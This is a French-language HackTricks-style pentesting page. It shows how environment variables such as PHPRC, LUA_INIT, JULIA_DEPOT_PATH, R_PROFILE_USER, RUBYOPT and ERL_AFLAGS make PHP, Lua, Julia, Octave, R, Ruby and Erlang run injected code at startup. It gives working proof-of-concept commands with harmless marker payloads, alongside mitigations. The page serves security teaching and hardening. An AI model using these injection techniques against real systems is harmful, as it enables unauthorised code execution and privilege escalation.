# Injection au démarrage de l’interpréteur macOS via des variables d’environnement

{{#include ../../../banners/hacktricks-training.md}}

Ces techniques spécifiques à l’environnement d’exécution utilisent des variables d’environnement héritées pour sélectionner une configuration de démarrage, précharger du code ou fournir des options de VM avant le lancement de la charge de travail prévue. Certaines variantes reposent sur des fichiers ; Lua et Erlang prennent également en charge l’exécution de code intégré.

## Configuration de démarrage de PHP

### `PHPRC` / `PHP_INI_SCAN_DIR` et `auto_prepend_file`

PHP CLI et CGI lisent la configuration à chaque invocation. `PHPRC` peut sélectionner un fichier `php.ini` accessible à l’attaquant, tandis que `PHP_INI_SCAN_DIR` peut rediriger le répertoire analysé pour trouver des fichiers `.ini` supplémentaires. La directive `auto_prepend_file` fait analyser un fichier par PHP avant le script demandé ; cette combinaison permet donc l’exécution de code au démarrage.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

Une autre possibilité est un répertoire contenant un fichier `.ini` :

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

L’option `-n` ignore `php.ini` ; un chemin `-c` de confiance explicite a priorité sur `PHPRC`. Rappelez-vous qu’un SAPI serveur de longue durée lit normalement la configuration au démarrage du serveur web, tandis que CLI et CGI le font à chaque invocation.<sup>[[1]](#references)</sup>

## Code de démarrage Lua

### `LUA_INIT`

Avant de traiter les options de ligne de commande ou le script cible, l’interpréteur Lua autonome exécute `LUA_INIT_<major>_<minor>` ou, si la variable versionnée est absente, `LUA_INIT`. Une valeur commençant par `@` désigne un fichier ; toute autre valeur est directement évaluée comme du code Lua. Cela permet une exécution au démarrage avec ou sans fichier.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

Le nom exact, avec sa version, varie selon l’interpréteur, par exemple `LUA_INIT_5_4`. `lua -E` ignore toutes les variables d’environnement, y compris le code de démarrage et les chemins des modules Lua.

## Dépôt de démarrage Julia

### `JULIA_DEPOT_PATH` et `startup.jl`

Julia exécute normalement `config/startup.jl` depuis son premier dépôt au démarrage. `JULIA_DEPOT_PATH` contrôle la liste des dépôts ; le définir sur une arborescence accessible en lecture par un attaquant redirige le fichier de démarrage chargé automatiquement.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

Le séparateur final est utile si la victime a encore besoin de ses paquets habituels. `julia --startup-file=no` désactive ce fichier de démarrage. Effacez la variable avant le lancement, car elle contrôle également les registres de paquets, les environnements, les caches et les emplacements de chargement du code.

## Fichiers de démarrage de GNU Octave

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave exécute au démarrage plusieurs fichiers contenant des commandes Octave valides. `OCTAVE_SITE_INITFILE` remplace le fichier de démarrage global et `OCTAVE_VERSION_INITFILE` remplace celui propre à la version, ce qui permet à l’une ou l’autre variable de rediriger l’exécution automatique vers un fichier lisible par un attaquant.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` ignore uniquement les fichiers utilisateur tels que `~/.octaverc` ; il **n’empêche pas** la substitution du fichier système mentionnée ci-dessus. Utilisez `--no-site-file` pour les fichiers système, ou `--norc` / `-f` pour désactiver tous les fichiers de démarrage.<sup>[[7]](#references)</sup>

## Profils de démarrage R et chargement des packages

### `R_PROFILE_USER` / `R_PROFILE`

Au démarrage, R exécute les fichiers de profil système et utilisateur contenant du code R. `R_PROFILE` sélectionne le profil système et `R_PROFILE_USER` sélectionne le profil utilisateur, ce qui permet à un environnement hérité de rediriger l’une ou l’autre recherche vers un fichier lisible par un attaquant.<sup>[[8]](#references)</sup>

```bash
echo 'file.create("/tmp/r-profile-executed")' >/tmp/attacker.Rprofile
R_PROFILE_USER=/tmp/attacker.Rprofile Rscript victim.R
```

`--no-init-file` ignore le profil utilisateur, `--no-site-file` ignore le profil système, et `--vanilla` inclut les deux protections. R traite d’abord les fichiers d’environnement sélectionnés par `R_ENVIRON` et `R_ENVIRON_USER`, mais ces fichiers ne font que définir des variables ; les variables de profil constituent le mécanisme direct d’exécution de code arbitraire.

### `R_DEFAULT_PACKAGES` / `R_SCRIPT_DEFAULT_PACKAGES` et chemins des bibliothèques

Au démarrage, R charge les packages séparés par des virgules indiqués dans `R_DEFAULT_PACKAGES`. `Rscript` donne la priorité à `R_SCRIPT_DEFAULT_PACKAGES`. L’association de l’une ou l’autre de ces variables avec `R_LIBS`, `R_LIBS_USER` ou `R_LIBS_SITE` peut amener R à trouver et charger un package installé contrôlé par l’attaquant ; son hook `.onLoad` ou `.onAttach` s’exécute automatiquement.<sup>[[8]](#references)[[9]](#references)</sup>

```bash
# Assume an installed package named htpayload exists below /tmp/r-library.
R_LIBS_USER=/tmp/r-library \
R_DEFAULT_PACKAGES=htpayload \
R --no-save --no-restore --silent

R_LIBS_USER=/tmp/r-library \
R_SCRIPT_DEFAULT_PACKAGES=htpayload \
Rscript victim.R
```

Cela nécessite un package R installé et structurellement valide, et pas simplement un fichier `.R` isolé. `--vanilla` n’efface pas les variables héritées directement ; un wrapper de confiance doit donc supprimer ou remplacer les variables relatives aux packages par défaut et aux chemins des bibliothèques, en plus de désactiver les fichiers de profil.

## Options du loader Ruby

### RUBYOPT

Ruby analyse les options de ligne de commande prises en charge dans la variable d’environnement `RUBYOPT` avant d’exécuter un script. Ruby rejette l’exécution de code via `-e` dans `RUBYOPT`, mais `-I` peut ajouter un répertoire au début du chemin de recherche des bibliothèques et `-r` peut charger une bibliothèque. Un processus qui lance Ruby avec des variables d’environnement contrôlées par un attaquant peut donc être amené à charger du code Ruby contrôlé par celui-ci.<sup>[[10]](#references)</sup>

Créez `/tmp/inject.rb` :

```ruby:inject.rb
puts `whoami`
```

Créez un script Ruby inoffensif, comme `hello.rb` :

```ruby:hello.rb
puts 'Hello, World!'
```

Exécutez-le avec une valeur contrôlée de `RUBYOPT` :

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

Pour désactiver ce comportement, passez `--disable=rubyopt` (ou `--disable-rubyopt`) **avant** le nom du script :<sup>[[10]](#references)</sup>

```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```

Une option écrite après `hello.rb` est transmise au script dans `ARGV` ; elle ne désactive pas le traitement préalable de `RUBYOPT` par Ruby.<sup>[[10]](#references)</sup>

```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```

### RUBYLIB

Au lieu de préfixer le répertoire de chargement avec `-I` dans `RUBYOPT`, la variable d’environnement distincte `RUBYLIB` ajoute des répertoires au `$LOAD_PATH` de Ruby. Combinée à `RUBYOPT=-r<module>`, elle charge le code de l’attaquant sans nécessiter `-I` dans `RUBYOPT` :<sup>[[10]](#references)</sup>

```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```

## Indicateurs de VM Erlang et Elixir

### `ERL_AFLAGS`, `ERL_FLAGS` et `ERL_ZFLAGS`

Le lanceur `erl` ajoute `ERL_AFLAGS` au début de sa ligne de commande et `ERL_FLAGS` / `ERL_ZFLAGS` à la fin. Comme `-eval` évalue une expression Erlang pendant l’initialisation de la VM, ces variables peuvent permettre l’exécution de code sans fichier avant le démarrage de la charge de travail prévue.<sup>[[11]](#references)</sup>

```bash
ERL_AFLAGS="-noshell -eval 'file:write_file(\"/tmp/erl-aflags-executed\", <<\"ok\">>).' -s init stop" erl
```

Elixir, Mix, Phoenix et de nombreuses releases Elixir démarrent finalement la VM Erlang et peuvent hériter de ces flags. Vérifiez le wrapper exact de la release : il peut reconstruire ou assainir les arguments de la VM, tandis que certains outils prennent explicitement en charge `ERL_AFLAGS`, `ERL_ZFLAGS` ou `ELIXIR_ERL_OPTIONS`.<sup>[[12]](#references)</sup>

Contrairement à la plupart des techniques reposant sur un fichier, le payload `-eval` ne nécessite aucun fichier contrôlé par l’attaquant. Un wrapper de confiance doit effacer les trois variables de flags Erlang (ainsi que `ELIXIR_ERL_OPTIONS` pour Elixir) avant de démarrer le runtime ; n’essayez pas d’autoriser certains flags de la VM à l’aide d’une allowlist, sauf si le parseur et l’ordre sont parfaitement compris.

## References

- [1] [Fichier de configuration PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Interpréteur autonome Lua 5.4](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Interface en ligne de commande de Julia : fichier de démarrage](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Variables d’environnement Julia : `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [Fichiers de démarrage GNU Octave](https://docs.octave.org/latest/Startup-Files.html)
- [7] [Options de ligne de commande GNU Octave](https://docs.octave.org/latest/Command-Line-Options.html)
- [8] [Initialisation au démarrage d’une session R](https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html)
- [9] [Installation et administration de R : packages additionnels](https://stat.ethz.ch/CRAN/doc/manuals/r-release/R-admin.html)
- [10] [Documentation Ruby - Options de ligne de commande Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
- [11] [Commande `erl` et variables d’environnement](https://www.erlang.org/doc/apps/erts/erl_cmd.html)
- [12] [Releases Elixir et options d’environnement de la VM](https://hexdocs.pm/elixir/releases.html#operating-system-scripts)
{{#include ../../../banners/hacktricks-training.md}}
